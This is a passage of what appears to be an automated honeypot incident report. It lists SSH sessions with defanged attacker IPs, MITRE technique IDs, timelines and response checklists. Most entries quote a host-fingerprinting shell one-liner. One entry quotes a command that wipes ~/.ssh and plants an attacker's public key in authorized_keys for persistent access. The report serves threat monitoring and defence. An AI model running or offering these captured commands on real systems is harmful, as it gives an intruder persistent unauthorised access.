|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:13 |
| **Last Seen** | 2026-07-06 15:13 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:13:33` | `cowrie.session.connect` |
| `2026-07-06 15:13:35` | `cowrie.client.version` |
| `2026-07-06 15:13:35` | `cowrie.client.kex` |
| `2026-07-06 15:13:43` | `cowrie.login.success` |
| `2026-07-06 15:13:46` | `cowrie.session.params` |
| `2026-07-06 15:13:46` | `cowrie.command.input` |
| `2026-07-06 15:13:46` | `cowrie.command.input` |
| `2026-07-06 15:13:46` | `cowrie.command.input` |
| `2026-07-06 15:13:46` | `cowrie.command.input` |
| `2026-07-06 15:13:46` | `cowrie.command.input` |
| `2026-07-06 15:13:46` | `cowrie.command.success` |
| `2026-07-06 15:13:46` | `cowrie.command.input` |
| `2026-07-06 15:13:46` | `cowrie.command.input` |
| `2026-07-06 15:13:46` | `cowrie.command.input` |
| `2026-07-06 15:13:46` | `cowrie.command.input` |
| `2026-07-06 15:13:47` | `cowrie.log.closed` |
| `2026-07-06 15:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f73a6433d287

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:14 |
| **Last Seen** | 2026-07-06 15:15 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:14:59` | `cowrie.session.connect` |
| `2026-07-06 15:15:03` | `cowrie.client.version` |
| `2026-07-06 15:15:03` | `cowrie.client.kex` |
| `2026-07-06 15:15:16` | `cowrie.login.success` |
| `2026-07-06 15:15:18` | `cowrie.session.params` |
| `2026-07-06 15:15:18` | `cowrie.command.input` |
| `2026-07-06 15:15:18` | `cowrie.command.input` |
| `2026-07-06 15:15:18` | `cowrie.command.input` |
| `2026-07-06 15:15:18` | `cowrie.command.input` |
| `2026-07-06 15:15:18` | `cowrie.command.input` |
| `2026-07-06 15:15:18` | `cowrie.command.success` |
| `2026-07-06 15:15:18` | `cowrie.command.input` |
| `2026-07-06 15:15:18` | `cowrie.command.input` |
| `2026-07-06 15:15:18` | `cowrie.command.input` |
| `2026-07-06 15:15:18` | `cowrie.command.input` |
| `2026-07-06 15:15:21` | `cowrie.log.closed` |
| `2026-07-06 15:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd213bb30305

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:16 |
| **Last Seen** | 2026-07-06 15:16 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:16:29` | `cowrie.session.connect` |
| `2026-07-06 15:16:38` | `cowrie.client.version` |
| `2026-07-06 15:16:38` | `cowrie.client.kex` |
| `2026-07-06 15:16:48` | `cowrie.login.success` |
| `2026-07-06 15:16:49` | `cowrie.session.params` |
| `2026-07-06 15:16:49` | `cowrie.command.input` |
| `2026-07-06 15:16:49` | `cowrie.command.input` |
| `2026-07-06 15:16:49` | `cowrie.command.input` |
| `2026-07-06 15:16:49` | `cowrie.command.input` |
| `2026-07-06 15:16:49` | `cowrie.command.input` |
| `2026-07-06 15:16:49` | `cowrie.command.success` |
| `2026-07-06 15:16:49` | `cowrie.command.input` |
| `2026-07-06 15:16:49` | `cowrie.command.input` |
| `2026-07-06 15:16:49` | `cowrie.command.input` |
| `2026-07-06 15:16:49` | `cowrie.command.input` |
| `2026-07-06 15:16:50` | `cowrie.log.closed` |
| `2026-07-06 15:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e37d054fb22c

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]36` |
| **First Seen** | 2026-07-06 15:17 |
| **Last Seen** | 2026-07-06 15:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:17:46` | `cowrie.session.connect` |
| `2026-07-06 15:17:46` | `cowrie.client.version` |
| `2026-07-06 15:17:46` | `cowrie.client.kex` |
| `2026-07-06 15:17:47` | `cowrie.login.success` |
| `2026-07-06 15:17:47` | `cowrie.session.params` |
| `2026-07-06 15:17:47` | `cowrie.command.input` |
| `2026-07-06 15:17:47` | `cowrie.command.failed` |
| `2026-07-06 15:17:48` | `cowrie.log.closed` |
| `2026-07-06 15:17:48` | `cowrie.session.params` |
| `2026-07-06 15:17:48` | `cowrie.command.input` |
| `2026-07-06 15:17:48` | `cowrie.session.file_download` |
| `2026-07-06 15:17:48` | `cowrie.log.closed` |
| `2026-07-06 15:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]36` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a8dac2cd784

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]36` |
| **First Seen** | 2026-07-06 15:17 |
| **Last Seen** | 2026-07-06 15:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:17:49` | `cowrie.session.connect` |
| `2026-07-06 15:17:49` | `cowrie.client.version` |
| `2026-07-06 15:17:49` | `cowrie.client.kex` |
| `2026-07-06 15:17:49` | `cowrie.login.success` |
| `2026-07-06 15:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]36` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb2aeb0b3d8f

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]36` |
| **First Seen** | 2026-07-06 15:17 |
| **Last Seen** | 2026-07-06 15:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:17:49` | `cowrie.session.connect` |
| `2026-07-06 15:17:49` | `cowrie.client.version` |
| `2026-07-06 15:17:49` | `cowrie.client.kex` |
| `2026-07-06 15:17:50` | `cowrie.login.success` |
| `2026-07-06 15:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]36` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d445722a36

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:19 |
| **Last Seen** | 2026-07-06 15:19 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:19:12` | `cowrie.session.connect` |
| `2026-07-06 15:19:14` | `cowrie.client.version` |
| `2026-07-06 15:19:14` | `cowrie.client.kex` |
| `2026-07-06 15:19:24` | `cowrie.login.success` |
| `2026-07-06 15:19:26` | `cowrie.session.params` |
| `2026-07-06 15:19:26` | `cowrie.command.input` |
| `2026-07-06 15:19:26` | `cowrie.command.input` |
| `2026-07-06 15:19:26` | `cowrie.command.input` |
| `2026-07-06 15:19:26` | `cowrie.command.input` |
| `2026-07-06 15:19:26` | `cowrie.command.input` |
| `2026-07-06 15:19:26` | `cowrie.command.success` |
| `2026-07-06 15:19:26` | `cowrie.command.input` |
| `2026-07-06 15:19:26` | `cowrie.command.input` |
| `2026-07-06 15:19:26` | `cowrie.command.input` |
| `2026-07-06 15:19:26` | `cowrie.command.input` |
| `2026-07-06 15:19:28` | `cowrie.log.closed` |
| `2026-07-06 15:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d25c0f466a62

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:20 |
| **Last Seen** | 2026-07-06 15:21 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:20:42` | `cowrie.session.connect` |
| `2026-07-06 15:20:46` | `cowrie.client.version` |
| `2026-07-06 15:20:46` | `cowrie.client.kex` |
| `2026-07-06 15:20:54` | `cowrie.login.success` |
| `2026-07-06 15:20:58` | `cowrie.session.params` |
| `2026-07-06 15:20:58` | `cowrie.command.input` |
| `2026-07-06 15:20:58` | `cowrie.command.input` |
| `2026-07-06 15:20:58` | `cowrie.command.input` |
| `2026-07-06 15:20:58` | `cowrie.command.input` |
| `2026-07-06 15:20:58` | `cowrie.command.input` |
| `2026-07-06 15:20:58` | `cowrie.command.success` |
| `2026-07-06 15:20:58` | `cowrie.command.input` |
| `2026-07-06 15:20:58` | `cowrie.command.input` |
| `2026-07-06 15:20:58` | `cowrie.command.input` |
| `2026-07-06 15:20:58` | `cowrie.command.input` |
| `2026-07-06 15:21:01` | `cowrie.log.closed` |
| `2026-07-06 15:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81d2bac02f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:22 |
| **Last Seen** | 2026-07-06 15:22 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:22:14` | `cowrie.session.connect` |
| `2026-07-06 15:22:17` | `cowrie.client.version` |
| `2026-07-06 15:22:17` | `cowrie.client.kex` |
| `2026-07-06 15:22:26` | `cowrie.login.success` |
| `2026-07-06 15:22:29` | `cowrie.session.params` |
| `2026-07-06 15:22:29` | `cowrie.command.input` |
| `2026-07-06 15:22:29` | `cowrie.command.input` |
| `2026-07-06 15:22:29` | `cowrie.command.input` |
| `2026-07-06 15:22:29` | `cowrie.command.input` |
| `2026-07-06 15:22:29` | `cowrie.command.input` |
| `2026-07-06 15:22:29` | `cowrie.command.success` |
| `2026-07-06 15:22:29` | `cowrie.command.input` |
| `2026-07-06 15:22:29` | `cowrie.command.input` |
| `2026-07-06 15:22:29` | `cowrie.command.input` |
| `2026-07-06 15:22:29` | `cowrie.command.input` |
| `2026-07-06 15:22:30` | `cowrie.log.closed` |
| `2026-07-06 15:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b6802b97629

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 15:22 |
| **Last Seen** | 2026-07-06 15:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:22:49` | `cowrie.session.connect` |
| `2026-07-06 15:22:49` | `cowrie.client.version` |
| `2026-07-06 15:22:49` | `cowrie.client.kex` |
| `2026-07-06 15:22:49` | `cowrie.login.success` |
| `2026-07-06 15:22:49` | `cowrie.direct-tcpip.request` |
| `2026-07-06 15:22:49` | `cowrie.direct-tcpip.data` |
| `2026-07-06 15:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c782d0fe56f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:23 |
| **Last Seen** | 2026-07-06 15:24 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:23:44` | `cowrie.session.connect` |
| `2026-07-06 15:23:49` | `cowrie.client.version` |
| `2026-07-06 15:23:49` | `cowrie.client.kex` |
| `2026-07-06 15:23:59` | `cowrie.login.success` |
| `2026-07-06 15:24:02` | `cowrie.session.params` |
| `2026-07-06 15:24:02` | `cowrie.command.input` |
| `2026-07-06 15:24:02` | `cowrie.command.input` |
| `2026-07-06 15:24:02` | `cowrie.command.input` |
| `2026-07-06 15:24:02` | `cowrie.command.input` |
| `2026-07-06 15:24:02` | `cowrie.command.input` |
| `2026-07-06 15:24:02` | `cowrie.command.success` |
| `2026-07-06 15:24:02` | `cowrie.command.input` |
| `2026-07-06 15:24:02` | `cowrie.command.input` |
| `2026-07-06 15:24:02` | `cowrie.command.input` |
| `2026-07-06 15:24:02` | `cowrie.command.input` |
| `2026-07-06 15:24:04` | `cowrie.log.closed` |
| `2026-07-06 15:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c95e83023628

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 15:24 |
| **Last Seen** | 2026-07-06 15:24 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:24:08` | `cowrie.session.connect` |
| `2026-07-06 15:24:09` | `cowrie.client.version` |
| `2026-07-06 15:24:09` | `cowrie.client.kex` |
| `2026-07-06 15:24:15` | `cowrie.login.success` |
| `2026-07-06 15:24:19` | `cowrie.session.params` |
| `2026-07-06 15:24:19` | `cowrie.command.input` |
| `2026-07-06 15:24:20` | `cowrie.log.closed` |
| `2026-07-06 15:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7afeac96d14e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:25 |
| **Last Seen** | 2026-07-06 15:25 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:25:17` | `cowrie.session.connect` |
| `2026-07-06 15:25:20` | `cowrie.client.version` |
| `2026-07-06 15:25:20` | `cowrie.client.kex` |
| `2026-07-06 15:25:30` | `cowrie.login.success` |
| `2026-07-06 15:25:32` | `cowrie.session.params` |
| `2026-07-06 15:25:32` | `cowrie.command.input` |
| `2026-07-06 15:25:32` | `cowrie.command.input` |
| `2026-07-06 15:25:32` | `cowrie.command.input` |
| `2026-07-06 15:25:32` | `cowrie.command.input` |
| `2026-07-06 15:25:32` | `cowrie.command.input` |
| `2026-07-06 15:25:32` | `cowrie.command.success` |
| `2026-07-06 15:25:32` | `cowrie.command.input` |
| `2026-07-06 15:25:32` | `cowrie.command.input` |
| `2026-07-06 15:25:32` | `cowrie.command.input` |
| `2026-07-06 15:25:32` | `cowrie.command.input` |
| `2026-07-06 15:25:33` | `cowrie.log.closed` |
| `2026-07-06 15:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab12ee68e8b

| Field | Detail |
|---|---|
| **Source IP** | `125.20.210[.]182` |
| **First Seen** | 2026-07-06 15:26 |
| **Last Seen** | 2026-07-06 15:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:26:46` | `cowrie.session.connect` |
| `2026-07-06 15:26:47` | `cowrie.telnet.option` |
| `2026-07-06 15:26:48` | `cowrie.telnet.option` |
| `2026-07-06 15:27:48` | `cowrie.login.success` |
| `2026-07-06 15:27:49` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `125.20.210[.]182` to AbuseIPDB if not already reported
- [ ] Block `125.20.210[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d165e6ba6c81

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:26 |
| **Last Seen** | 2026-07-06 15:27 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:26:54` | `cowrie.session.connect` |
| `2026-07-06 15:26:56` | `cowrie.client.version` |
| `2026-07-06 15:26:56` | `cowrie.client.kex` |
| `2026-07-06 15:27:06` | `cowrie.login.success` |
| `2026-07-06 15:27:08` | `cowrie.session.params` |
| `2026-07-06 15:27:08` | `cowrie.command.input` |
| `2026-07-06 15:27:08` | `cowrie.command.input` |
| `2026-07-06 15:27:08` | `cowrie.command.input` |
| `2026-07-06 15:27:08` | `cowrie.command.input` |
| `2026-07-06 15:27:08` | `cowrie.command.input` |
| `2026-07-06 15:27:08` | `cowrie.command.success` |
| `2026-07-06 15:27:08` | `cowrie.command.input` |
| `2026-07-06 15:27:08` | `cowrie.command.input` |
| `2026-07-06 15:27:08` | `cowrie.command.input` |
| `2026-07-06 15:27:08` | `cowrie.command.input` |
| `2026-07-06 15:27:10` | `cowrie.log.closed` |
| `2026-07-06 15:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

